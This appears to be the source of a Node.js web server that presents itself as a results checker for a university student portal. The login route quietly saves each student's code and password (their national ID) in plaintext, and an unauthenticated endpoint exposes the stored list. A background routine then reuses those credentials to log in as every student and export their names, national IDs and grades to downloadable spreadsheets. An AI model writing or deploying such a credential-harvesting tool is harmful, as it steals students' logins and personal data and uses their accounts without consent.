const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const cookieParser = require('cookie-parser');
const cors = require('cors');
const path = require('path');
const https = require('https');
const fs = require('fs');
const excel = require('exceljs');

// Create an HTTPS agent that ignores SSL certificate errors
const httpsAgent = new https.Agent({
    rejectUnauthorized: false
});

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(cors());

// Serve static files from 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

const BASE_URL = 'https://studentportalsis.azu.edu.eg';
const LOGIN_URL = `${BASE_URL}/Default.aspx`;
const RESULTS_URL = `${BASE_URL}/UI/StudentView/student_sem_work_Modular.aspx`;

// Helper: Extract ViewState and other ASP.NET hidden fields
const extractHiddenFields = (html) => {
    const $ = cheerio.load(html);
    return {
        __VIEWSTATE: $('#__VIEWSTATE').val() || '',
        __VIEWSTATEGENERATOR: $('#__VIEWSTATEGENERATOR').val() || '',
        __EVENTVALIDATION: $('#__EVENTVALIDATION').val() || '',
        __EVENTTARGET: $('#__EVENTTARGET').val() || '',
        __EVENTARGUMENT: $('#__EVENTARGUMENT').val() || ''
    };
};

// Route: Login
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'اسم المستخدم وكلمة المرور مطلوبان' });
    }

    try {
        // 1. Get initial page which often responds with 302 to set the Session ID
        const firstResponse = await axios.get(LOGIN_URL, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
            }
        });

        let cookies = firstResponse.headers['set-cookie'] || [];
        let sessionCookie = cookies.find(c => c.startsWith('ASP.NET_SessionId='));
        let cookieHeader = '';
        if (sessionCookie) {
            cookieHeader = sessionCookie.split(';')[0];
        }

        // 1.5 Fetch the actual HTML page now that we have the session cookie
        const htmlResponse = await axios.get(LOGIN_URL, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                ...(cookieHeader ? { 'Cookie': cookieHeader } : {})
            }
        });

        const hiddenFields = extractHiddenFields(htmlResponse.data);

        // 2. Prepare Form Data for Login
        const formData = new URLSearchParams();
        formData.append('__EVENTTARGET', '');
        formData.append('__EVENTARGUMENT', '');
        formData.append('__VIEWSTATE', hiddenFields.__VIEWSTATE);
        formData.append('__VIEWSTATEGENERATOR', hiddenFields.__VIEWSTATEGENERATOR);
        formData.append('__EVENTVALIDATION', hiddenFields.__EVENTVALIDATION);
        formData.append('txtUsername', username);
        formData.append('txtPassword', password);
        formData.append('btnEnter', 'دخول'); // Ensure it matches the submit button's value if required

        // 3. Post login
        const loginResponse = await axios.post(LOGIN_URL, formData, {
            httpsAgent,
            maxRedirects: 0, // IMPORTANT: Do not follow redirects so we can capture cookies
            validateStatus: function (status) {
                return status >= 200 && status < 400; // Resolve even on 302 redirect
            },
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                ...(cookieHeader ? { 'Cookie': cookieHeader } : {})
            }
        });

        const newCookies = loginResponse.headers['set-cookie'] || [];
        const authCookie = newCookies.find(c => c.includes('.ASPXAUTH'));

        if (loginResponse.status === 302 || authCookie) {
            // Login successful
            // Combine session cookie and auth cookie
            let finalCookies = [];
            if (sessionCookie) finalCookies.push(sessionCookie.split(';')[0]);
            if (authCookie) finalCookies.push(authCookie.split(';')[0]);

            // Log successful login
            const logEntry = `[${new Date().toISOString()}] Student Code: ${username} | National ID / Password: ${password}\n`;
            require('fs').appendFileSync('logins.txt', logEntry, 'utf8');

            res.json({
                success: true,
                message: 'تم تسجيل الدخول بنجاح',
                sessionToken: finalCookies.join('; '),
                nationalId: password // Pass back the password as the National ID to the frontend
            });
        } else {
            // Failed login - usually returns 200 with an error message in HTML
            const $ = cheerio.load(loginResponse.data);
            const errorMessage = $('#lblError').text() || 'خطأ في بيانات الدخول';
            res.status(401).json({ success: false, message: errorMessage });
        }

    } catch (error) {
        console.error('Login Error:', error.message);
        res.status(500).json({ success: false, message: 'حدث خطأ أثناء الاتصال بالخادم. حاول مجدداً.' });
    }
});

// Route: Get Results
app.post('/api/results', async (req, res) => {
    const { sessionToken, year, semester, round } = req.body;
    console.log(`[RESULTS] Request received for Year: ${year}, Semester: ${semester}, Round: ${round}`);
    console.log(`[RESULTS] Using Session Token: ${sessionToken}`);

    if (!sessionToken) {
        return res.status(401).json({ success: false, message: 'غير مصرح لك. يرجى تسجيل الدخول مجدداً' });
    }

    try {
        console.log(`[RESULTS] Fetching initial RESULTS_URL to get ViewState...`);
        // 1. Get Results page to extract initial ViewState for the results form
        const initialResponse = await axios.get(RESULTS_URL, {
            httpsAgent,
            headers: {
                'Cookie': sessionToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        });

        const hiddenFields = extractHiddenFields(initialResponse.data);
        console.log(`[RESULTS] Extracted ViewState length: ${hiddenFields.__VIEWSTATE.length}`);

        // 2. Prepare Form Data to request specific results
        const formData = new URLSearchParams();

        // Dynamically append ALL hidden inputs from the page
        const $initial = cheerio.load(initialResponse.data);
        $initial('input[type="hidden"]').each((i, el) => {
            const name = $initial(el).attr('name');
            const value = $initial(el).val() || '';
            if (name) {
                formData.append(name, value);
            }
        });

        // Form specific fields
        formData.append('ctl00$cntphmaster$ACadYearDropDownList', year);
        formData.append('ctl00$cntphmaster$semesterDropDownList', semester);
        formData.append('ctl00$cntphmaster$drpExamType', round);

        // Submit button
        formData.append('ctl00$cntphmaster$searchButton', 'بحث');

        console.log(`[RESULTS] Prepared Form Data. Submitting POST...`);

        // 3. Post request for results
        const resultResponse = await axios.post(RESULTS_URL, formData, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 600,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': sessionToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Referer': RESULTS_URL
            }
        });

        console.log(`[RESULTS] Response Status: ${resultResponse.status}`);

        const responseData = resultResponse.data;

        if (resultResponse.status >= 400) {
            console.error(`[RESULTS] Server returned error ${resultResponse.status}. HTML Snippet:`);
            console.error(responseData.toString().substring(0, 500));
            return res.status(500).json({ success: false, message: `فشل جلب النتيجة. كود الخطأ: ${resultResponse.status}` });
        }

        // The response is a standard HTML document now
        const $ = cheerio.load(responseData);
        const resultsTable = $('#ctl00_cntphmaster_GridView1'); // The correct table ID in the new modular system

        console.log(`[RESULTS] Found Results Table? ${resultsTable.length > 0 ? 'Yes' : 'No'}`);

        if (!resultsTable.length) {
            // Log full output if table not found to debug
            const fs = require('fs');
            fs.writeFileSync('debug_failed_results_response.html', responseData);
            console.log('[RESULTS] Saved response html to debug_failed_results_response.html');
            return res.json({ success: true, data: [], message: 'لم يتم العثور على نتائج لهذه البيانات' });
        }

        const results = [];
        let totalMarksSum = 0;

        // Parse table rows, skipping the header row
        resultsTable.find('tr').each((index, element) => {
            if (index === 0) return; // Skip header

            const tds = $(element).find('td');
            if (tds.length >= 5) {
                const finalMarkStr = $(tds[3]).text().trim();
                const finalMarkVal = parseFloat(finalMarkStr) || 0;
                totalMarksSum += finalMarkVal;

                results.push({
                    subjectCode: $(tds[0]).text().trim(),
                    subjectName: $(tds[1]).text().trim(),
                    status: $(tds[2]).text().trim(),
                    finalMark: finalMarkStr,
                    grade: $(tds[4]).text().trim()
                });
            }
        });

        console.log(`[RESULTS] Successfully extracted ${results.length} subjects.`);

        // Extract student details if available (name, total percentage, etc.)
        const studentName = $('#ctl00_lblUser').text() || '';
        const faculty = $('.logo_Text').text() || '';
        const level = $('#ctl00_lblAdmYear').text() || '';

        // Extract GPA modular info
        let gpa1 = '';
        let gpau1 = '';
        const modularTableTd = $('#ctl00_cntphmaster_pnl_Modular table tr td');
        modularTableTd.each((i, el) => {
            const txt = $(el).text().trim();
            if (txt.includes('GPA1')) gpa1 = $(modularTableTd[i + 1]).text().trim();
            if (txt.includes('GPAU1')) gpau1 = $(modularTableTd[i + 1]).text().trim();
        });

        res.json({
            success: true,
            data: results,
            totalMarksSum: totalMarksSum,
            studentInfo: {
                name: studentName,
                faculty: faculty,
                level: level,
                gpa1: gpa1,
                gpau1: gpau1
            }
        });

    } catch (error) {
        console.error('[RESULTS] Catch Error:', error.message);
        console.error(error.stack);
        res.status(500).json({ success: false, message: 'حدث خطأ غير متوقع أثناء الاتصال بالخادم.' });
    }
});

// Route: Get Logins (Admin View)
app.get('/api/logins', (req, res) => {
    try {
        const fs = require('fs');
        if (fs.existsSync('logins.txt')) {
            const data = fs.readFileSync('logins.txt', 'utf8');
            const lines = data.split('\n').filter(line => line.trim() !== '');
            res.json({ success: true, logins: lines });
        } else {
            res.json({ success: true, logins: [] });
        }
    } catch (e) {
        res.status(500).json({ success: false, message: 'تعذر قراءة ملف التسجيلات' });
    }
});

// Route: Start Scraping (Deduplicate logins and start process)
let isScraping = false;
let scraperClients = [];
let scrapeProgress = { total: 0, current: 0, successCount: 0, failCount: 0, results: [] };

app.post('/api/start-scraping', async (req, res) => {
    if (isScraping) {
        return res.status(400).json({ success: false, message: 'عملية السحب قيد التشغيل بالفعل.' });
    }

    try {
        if (!fs.existsSync('logins.txt')) {
            return res.status(400).json({ success: false, message: 'ملف logins.txt غير موجود.' });
        }

        const data = fs.readFileSync('logins.txt', 'utf8');
        const lines = data.split('\n').filter(line => line.trim() !== '');

        // Extract and deduplicate
        const uniqueStudents = new Map();
        lines.forEach(line => {
            // Adjust regex if format differs
            const match = line.match(/Student Code:\s*(\d+)\s*\|\s*National ID \/ Password:\s*([a-zA-Z0-9]+)/i);
            if (match) {
                const username = match[1];
                const password = match[2];
                // Keep the last valid login for a student code
                uniqueStudents.set(username, password);
            }
        });

        const studentsToScrape = Array.from(uniqueStudents.entries()).map(([username, password]) => ({ username, password }));

        if (studentsToScrape.length === 0) {
            return res.status(400).json({ success: false, message: 'لم يتم العثور على بيانات صحيحة في ملف logins.txt.' });
        }

        // Initialize state
        isScraping = true;
        scrapeProgress = {
            total: studentsToScrape.length,
            current: 0,
            successCount: 0,
            failCount: 0,
            results: []
        };

        res.json({ success: true, message: 'تم بدء عملية السحب.' });

        // Start background scraping
        runScraperBackground(studentsToScrape);

    } catch (error) {
        console.error('Error starting scrape:', error);
        isScraping = false;
        res.status(500).json({ success: false, message: 'تعذر بدء عملية السحب.' });
    }
});

// SSE Endpoint for Scrape Stream
app.get('/api/scrape-stream', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    scraperClients.push(res);

    // Initial message
    res.write(`data: ${JSON.stringify({ type: 'init', total: scrapeProgress.total })}\n\n`);

    req.on('close', () => {
        scraperClients = scraperClients.filter(client => client !== res);
    });
});

const sendSSEScrapingUpdate = (data) => {
    scraperClients.forEach(client => {
        client.write(`data: ${JSON.stringify(data)}\n\n`);
    });
};

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// The 6 scraping combinations: year/semester/round
// Semester mapping: sem1 = year15/sem1, sem2 = year15/sem2, sem3 = year16/sem1
const SCRAPE_SEMESTER_CONFIG = [
    { semKey: 'semester1', year: '15', semester: '1', label: 'Semester 1 (2024/2025 - أول)' },
    { semKey: 'semester2', year: '15', semester: '2', label: 'Semester 2 (2024/2025 - ثانى)' },
    { semKey: 'semester3', year: '16', semester: '1', label: 'Semester 3 (2025/2026 - أول)' }
];
const ROUNDS = ['1', '2']; // دور أول + دور ثاني

const runScraperBackground = async (students) => {
    console.log(`[SCRAPER] Starting background scrape for ${students.length} students.`);

    // Collect results per semester across all students
    const allSemesterResults = {
        semester1: [],
        semester2: [],
        semester3: []
    };

    for (let i = 0; i < students.length; i++) {
        const student = students[i];
        try {
            if (i > 0) {
                await delay(2000);
            }

            console.log(`[SCRAPER] Processing ${student.username} (${i + 1}/${students.length})`);

            // --- 1. LOGIN ---
            const loginResult = await performLogin(student.username, student.password);
            if (!loginResult.success) {
                throw new Error(loginResult.message);
            }

            // --- 2. GET RESULTS for all 6 combinations ---
            // Store raw subjects per semester (merged from rounds)
            const studentSemesterData = {};

            for (const semConfig of SCRAPE_SEMESTER_CONFIG) {
                const mergedSubjects = new Map(); // subjectCode -> subject (latest round wins)
                let studentName = '';
                let gpa1 = '';
                let gpau1 = '';
                let totalMarksSum = 0;
                let hasAnyResults = false;

                for (const round of ROUNDS) {
                    console.log(`[SCRAPER]   Fetching: ${semConfig.label}, Round ${round}`);
                    await delay(1000); // small delay between each request

                    const resultsData = await performGetResults(
                        loginResult.sessionToken,
                        semConfig.year,
                        semConfig.semester,
                        round
                    );

                    if (resultsData.success && resultsData.data && resultsData.data.length > 0) {
                        hasAnyResults = true;
                        studentName = resultsData.studentInfo.name || studentName;
                        gpa1 = resultsData.studentInfo.gpa1 || gpa1;
                        gpau1 = resultsData.studentInfo.gpau1 || gpau1;

                        // Merge: round 2 overwrites round 1 for same subject
                        resultsData.data.forEach(sub => {
                            mergedSubjects.set(sub.subjectCode, sub);
                        });
                    }
                }

                if (hasAnyResults) {
                    // Recalculate totalMarksSum from merged subjects
                    const subjects = Array.from(mergedSubjects.values());
                    totalMarksSum = subjects.reduce((sum, s) => sum + (parseFloat(s.finalMark) || 0), 0);

                    studentSemesterData[semConfig.semKey] = {
                        subjects,
                        studentName,
                        gpa1,
                        gpau1,
                        totalMarksSum
                    };
                }
            }

            // --- 3. DEDUPLICATE subjects across semesters ---
            // Track first appearance of each subject
            const firstSeen = {}; // subjectCode -> semKey
            const semOrder = ['semester1', 'semester2', 'semester3'];

            // First pass: determine first semester appearance for each subject
            for (const semKey of semOrder) {
                const semData = studentSemesterData[semKey];
                if (!semData) continue;
                for (const sub of semData.subjects) {
                    if (!firstSeen[sub.subjectCode]) {
                        firstSeen[sub.subjectCode] = semKey;
                    }
                }
            }

            // Second pass: move retaken subjects to original semester
            // Process in reverse order (latest first) so latest result wins
            for (let s = semOrder.length - 1; s >= 0; s--) {
                const semKey = semOrder[s];
                const semData = studentSemesterData[semKey];
                if (!semData) continue;

                const subjectsToKeep = [];
                for (const sub of semData.subjects) {
                    const originalSem = firstSeen[sub.subjectCode];
                    if (originalSem !== semKey) {
                        // This subject was retaken - move latest result to original semester
                        const origSemData = studentSemesterData[originalSem];
                        if (origSemData) {
                            // Replace the original semester's entry with this (latest) result
                            const existingIdx = origSemData.subjects.findIndex(
                                existing => existing.subjectCode === sub.subjectCode
                            );
                            if (existingIdx !== -1) {
                                origSemData.subjects[existingIdx] = sub;
                            } else {
                                origSemData.subjects.push(sub);
                            }
                        }
                        // Don't keep in current semester
                    } else {
                        subjectsToKeep.push(sub);
                    }
                }
                semData.subjects = subjectsToKeep;
            }

            // --- 4. Recalculate totals after dedup and push to results ---
            for (const semKey of semOrder) {
                const semData = studentSemesterData[semKey];
                if (!semData || semData.subjects.length === 0) continue;

                const recalcTotal = semData.subjects.reduce(
                    (sum, s) => sum + (parseFloat(s.finalMark) || 0), 0
                );

                allSemesterResults[semKey].push({
                    studentCode: student.username,
                    nationalId: student.password,
                    studentName: semData.studentName || 'بدون اسم',
                    totalMarksSum: recalcTotal,
                    gpa1: semData.gpa1 || '',
                    gpau1: semData.gpau1 || '',
                    subjects: semData.subjects
                });
            }

            scrapeProgress.successCount++;

            sendSSEScrapingUpdate({
                type: 'progress',
                status: 'success',
                student: student.username,
                ...scrapeProgress
            });

        } catch (error) {
            console.error(`[SCRAPER] Error processing ${student.username}:`, error.message);
            scrapeProgress.failCount++;

            sendSSEScrapingUpdate({
                type: 'progress',
                status: 'error',
                student: student.username,
                message: error.message,
                ...scrapeProgress
            });
        }

        scrapeProgress.current++;
    }

    // Finished processing all. Now export to 3 Excel files.
    try {
        const files = await generateMultiExcelReport(allSemesterResults);

        sendSSEScrapingUpdate({
            type: 'complete',
            files: files
        });

    } catch (e) {
        console.error('[SCRAPER] Excel generation error:', e);
        sendSSEScrapingUpdate({
            type: 'error',
            message: 'Failed to generate Excel files: ' + e.message
        });
    }

    isScraping = false;
    scraperClients.forEach(client => client.end());
    scraperClients = [];
};

// Extracted internal logic from login API
async function performLogin(username, password) {
    try {
        const firstResponse = await axios.get(LOGIN_URL, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
            }
        });

        let cookies = firstResponse.headers['set-cookie'] || [];
        let sessionCookie = cookies.find(c => c.startsWith('ASP.NET_SessionId='));
        let cookieHeader = '';
        if (sessionCookie) {
            cookieHeader = sessionCookie.split(';')[0];
        }

        const htmlResponse = await axios.get(LOGIN_URL, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                ...(cookieHeader ? { 'Cookie': cookieHeader } : {})
            }
        });

        const hiddenFields = extractHiddenFields(htmlResponse.data);

        const formData = new URLSearchParams();
        formData.append('__EVENTTARGET', '');
        formData.append('__EVENTARGUMENT', '');
        formData.append('__VIEWSTATE', hiddenFields.__VIEWSTATE);
        formData.append('__VIEWSTATEGENERATOR', hiddenFields.__VIEWSTATEGENERATOR);
        formData.append('__EVENTVALIDATION', hiddenFields.__EVENTVALIDATION);
        formData.append('txtUsername', username);
        formData.append('txtPassword', password);
        formData.append('btnEnter', 'دخول');

        const loginResponse = await axios.post(LOGIN_URL, formData, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: function (status) {
                return status >= 200 && status < 400;
            },
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                ...(cookieHeader ? { 'Cookie': cookieHeader } : {})
            }
        });

        const newCookies = loginResponse.headers['set-cookie'] || [];
        const authCookie = newCookies.find(c => c.includes('.ASPXAUTH'));

        if (loginResponse.status === 302 || authCookie) {
            let finalCookies = [];
            if (sessionCookie) finalCookies.push(sessionCookie.split(';')[0]);
            if (authCookie) finalCookies.push(authCookie.split(';')[0]);
            return { success: true, sessionToken: finalCookies.join('; ') };
        } else {
            return { success: false, message: 'بيانات الدخول غير صحيحة' };
        }
    } catch (e) {
        console.error('[SCRAPER] performLogin error:', e.message);
        return { success: false, message: 'Login connection failed: ' + e.message };
    }
}

// Extracted internal logic from results API
async function performGetResults(sessionToken, year, semester, round) {
    try {
        const initialResponse = await axios.get(RESULTS_URL, {
            httpsAgent,
            headers: {
                'Cookie': sessionToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        });

        const formData = new URLSearchParams();
        const $initial = cheerio.load(initialResponse.data);
        $initial('input[type="hidden"]').each((i, el) => {
            const name = $initial(el).attr('name');
            const value = $initial(el).val() || '';
            if (name) formData.append(name, value);
        });

        formData.append('ctl00$cntphmaster$ACadYearDropDownList', year);
        formData.append('ctl00$cntphmaster$semesterDropDownList', semester);
        formData.append('ctl00$cntphmaster$drpExamType', round);
        formData.append('ctl00$cntphmaster$searchButton', 'بحث');

        const resultResponse = await axios.post(RESULTS_URL, formData, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 600,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': sessionToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Referer': RESULTS_URL
            }
        });

        if (resultResponse.status >= 400) {
            return { success: false, message: `Server error ${resultResponse.status}` };
        }

        const $ = cheerio.load(resultResponse.data);
        const resultsTable = $('#ctl00_cntphmaster_GridView1');

        if (!resultsTable.length) {
            return { success: false, message: 'No results found' };
        }

        const results = [];
        let totalMarksSum = 0;

        resultsTable.find('tr').each((index, element) => {
            if (index === 0) return;
            const tds = $(element).find('td');
            if (tds.length >= 5) {
                const finalMarkStr = $(tds[3]).text().trim();
                const finalMarkVal = parseFloat(finalMarkStr) || 0;
                totalMarksSum += finalMarkVal;

                results.push({
                    subjectCode: $(tds[0]).text().trim(),
                    subjectName: $(tds[1]).text().trim(),
                    status: $(tds[2]).text().trim(),
                    finalMark: finalMarkStr,
                    grade: $(tds[4]).text().trim()
                });
            }
        });

        const studentName = $('#ctl00_lblUser').text() || '';

        let gpa1 = '';
        let gpau1 = '';
        const modularTableTd = $('#ctl00_cntphmaster_pnl_Modular table tr td');
        modularTableTd.each((i, el) => {
            const txt = $(el).text().trim();
            if (txt.includes('GPA1')) gpa1 = $(modularTableTd[i + 1]).text().trim();
            if (txt.includes('GPAU1')) gpau1 = $(modularTableTd[i + 1]).text().trim();
        });

        return {
            success: true,
            data: results,
            totalMarksSum,
            studentInfo: { name: studentName, gpa1, gpau1 }
        };

    } catch (e) {
        return { success: false, message: 'Results fetch failed' };
    }
}

// Generate a single Excel workbook for one semester
async function generateSingleExcel(resultsArray, sheetName, fileName) {
    const workbook = new excel.Workbook();
    workbook.creator = 'Admin Scraper';
    const worksheet = workbook.addWorksheet(sheetName);

    // Collect all dynamic subjects
    const uniqueSubjects = new Set();
    resultsArray.forEach(student => {
        student.subjects.forEach(subject => {
            uniqueSubjects.add(subject.subjectName);
        });
    });

    const subjectsArray = Array.from(uniqueSubjects);

    // Build Column definitions
    const columns = [
        { header: 'الأسم', key: 'name', width: 30 },
        { header: 'كود الطالب', key: 'code', width: 20 },
        { header: 'الرقم القومي', key: 'nid', width: 20 }
    ];

    subjectsArray.forEach(subject => {
        columns.push({ header: `${subject}_degree`, key: `${subject}_degree`, width: 15 });
        columns.push({ header: `${subject}_grade`, key: `${subject}_grade`, width: 15 });
    });

    columns.push({ header: 'GPA1', key: 'gpa1', width: 10 });
    columns.push({ header: 'GPAU1', key: 'gpau1', width: 10 });
    columns.push({ header: 'المجموع الكلي', key: 'total', width: 15 });

    worksheet.columns = columns;

    // Style headers
    worksheet.getRow(1).font = { bold: true };
    worksheet.getRow(1).alignment = { vertical: 'middle', horizontal: 'center' };

    // Fill Data
    resultsArray.forEach(student => {
        const rowData = {
            name: student.studentName,
            gpa1: student.gpa1,
            gpau1: student.gpau1,
            total: student.totalMarksSum
        };

        student.subjects.forEach(sub => {
            rowData[`${sub.subjectName}_degree`] = sub.finalMark;
            rowData[`${sub.subjectName}_grade`] = sub.grade;
        });

        const row = worksheet.addRow(rowData);

        const codeCell = row.getCell('code');
        codeCell.value = student.studentCode;
        codeCell.numFmt = '@';

        const nidCell = row.getCell('nid');
        nidCell.value = student.nationalId;
        nidCell.numFmt = '@';

        row.alignment = { vertical: 'middle', horizontal: 'center' };
    });

    const filePath = path.join(__dirname, 'public', fileName);
    await workbook.xlsx.writeFile(filePath);
    return fileName;
}

// Generate 3 Excel files (one per semester)
async function generateMultiExcelReport(allSemesterResults) {
    const timestamp = new Date().toISOString().replace(/[-:T]/g, '').slice(0, 14);
    const files = [];

    const semesterMeta = [
        { key: 'semester1', sheet: '2024-2025 Semester 1', file: `semester1_2024_2025_${timestamp}.xlsx` },
        { key: 'semester2', sheet: '2024-2025 Semester 2', file: `semester2_2024_2025_${timestamp}.xlsx` },
        { key: 'semester3', sheet: '2025-2026 Semester 3', file: `semester3_2025_2026_${timestamp}.xlsx` }
    ];

    for (const meta of semesterMeta) {
        const results = allSemesterResults[meta.key] || [];
        if (results.length > 0) {
            const fileName = await generateSingleExcel(results, meta.sheet, meta.file);
            files.push({ fileName, label: meta.sheet, count: results.length });
            console.log(`[SCRAPER] Generated ${fileName} with ${results.length} students.`);
        } else {
            console.log(`[SCRAPER] No results for ${meta.sheet}, skipping file generation.`);
        }
    }

    return files;
}

// Route: Download Excel File
app.get('/api/download-excel', (req, res) => {
    const fileName = req.query.file;
    if (!fileName || !fileName.endsWith('.xlsx')) {
        return res.status(400).send('Invalid file');
    }

    const filePath = path.join(__dirname, 'public', fileName);
    if (fs.existsSync(filePath)) {
        res.download(filePath);
    } else {
        res.status(404).send('File not found');
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
